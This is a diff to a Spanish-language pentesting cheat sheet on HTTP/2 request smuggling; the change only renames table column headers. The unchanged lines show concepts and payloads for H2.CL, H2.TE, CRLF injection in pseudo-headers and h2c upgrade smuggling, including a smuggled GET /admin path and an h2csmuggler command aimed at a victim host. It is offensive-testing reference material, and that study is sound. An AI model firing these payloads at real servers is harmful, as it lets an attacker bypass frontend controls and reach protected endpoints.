@@ -23,7 +23,7 @@ linked:
 
 ## H2.CL (HTTP/2 → HTTP/1.1 + Content-Length)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Frontend habla H2, backend H1. Frontend traduce H2 → H1 y conserva el header `content-length` del request H2. Si CL no matchea body real → desync. | RFC 7540 dice que CL en H2 es informativa — frontend ingenuo la mantiene. |
 | Setup en Burp | Repeater → Inspector → "Request smuggling" → tipo H2.CL | Burp arma H2 raw frame. |
@@ -59,7 +59,7 @@ ___
 
 ## H2.TE (HTTP/2 → HTTP/1.1 + Transfer-Encoding)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | RFC 7540 §8.1.2.2 prohíbe `Transfer-Encoding` en H2. Frontend conformante rejecta. Frontend laxo lo forwarda al H1 backend → backend usa TE → desync. | Vector frequente porque devs olvidan validar. |
 | Setup | H2 request con header `transfer-encoding: chunked` | RFC viola — pero la frontera reenvía. |
@@ -75,7 +75,7 @@ ___
 
 ## H2 Request Line Injection (CRLF en pseudo-headers)
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concepto | Pseudo-headers H2 (`:method`, `:path`, `:authority`, `:scheme`) se traducen a request line en H1. Si frontend no sanitiza CRLF en value → inyección de líneas H1 enteras. | Vector "request line injection". |
 | Inject path | `:path: /foo HTTP/1.1\r\nHost: target\r\nX-Smuggle: 1\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Después de translate, queda como múltiples request lines H1. |
@@ -115,7 +115,7 @@ ___
 
 ## H2 Pseudo-Header Injection / h2c Smuggling
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | h2c upgrade smuggle | Request HTTP/1.1 con `Connection: Upgrade, HTTP2-Settings\r\nUpgrade: h2c\r\nHTTP2-Settings: <base64>` | Si backend acepta upgrade pero frontend no inspecciona, abrir túnel H2 directo al back bypassing front controls. |
 | h2cSmuggler tool | `h2csmuggler -x https://victim/ -X "GET /admin HTTP/1.1\r\nHost: victim\r\n\r\n"` | Auto-explota. |
